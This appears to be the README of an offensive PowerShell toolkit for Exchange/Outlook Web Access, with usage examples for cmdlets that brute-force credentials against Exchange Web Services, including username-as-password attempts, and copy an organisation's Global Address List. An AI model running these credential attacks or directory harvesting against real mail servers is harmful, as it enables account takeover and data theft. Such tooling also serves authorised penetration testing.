# OWA-Toolkit
Powershell module to assist in attacking Exchange/Outlook Web Access

NAME
    OTK-Init

SYNOPSIS
    This is a base cmd-let to produce an Exchange Web SErvice object

    -------------------------- EXAMPLE 1 --------------------------

    PS C:\>Creates an authencticated Exchange WEb Service object, can be used to intiate any methods exposed by the API


    $exchService = OTK-Init -Password "littlejohnny" -User "dbetty" -Domain "yourdomain.com" -ExchangeVersion 2007_SP1

NAME
    Brute-EWS

SYNOPSIS
    This is a multi-threaded powershell script to brute force credentials by testing credentials against an Exchange Web Service

    -------------------------- EXAMPLE 1 --------------------------

    PS C:\>Takes a list of userid and adds the domain, then attempted to authenticate with the password param


    Brute-EWS -TargetList .\userids.txt -ExchangeVersion 2007_SP1  -ewsPath "https://webmail.yourdomain.com/EWS/Exchange.asmx" -Password "omg123" -Domain "yourdomain.com"




    -------------------------- EXAMPLE 2 --------------------------

    PS C:\>Takes a list of userids or emails and authenticates against the excahnge web service with the userid as the password


    Brute-EWS -TargetList .\userids.txt -ExchangeVersion 2007_SP1  -ewsPath "https://webmail.yourdomain.com/EWS/Exchange.asmx" -UserAsPass Yes





NAME
    Steal-GAL

SYNOPSIS
    This is a  powershell script to enumerate and copy the Global Address List from an exposed Exchange Web Service

    -------------------------- EXAMPLE 1 --------------------------

    PS C:\>Initiates a connection to the EWS and pulls down the GAL


    Steal-GAL -Password "littlejohnny" -User "dbetty" -domain "yourdomain.com" -ExchangeVersion 2007_SP1




    -------------------------- EXAMPLE 2 --------------------------

    PS C:\>Accepts an exchService object from the pipeline then pulls down the GAL


    OTK-Init -Password "littlejohnny" -User "dbetty" -Domain "yourdomain.com" -ExchangeVersion 2007_SP1 | Steal-GAL






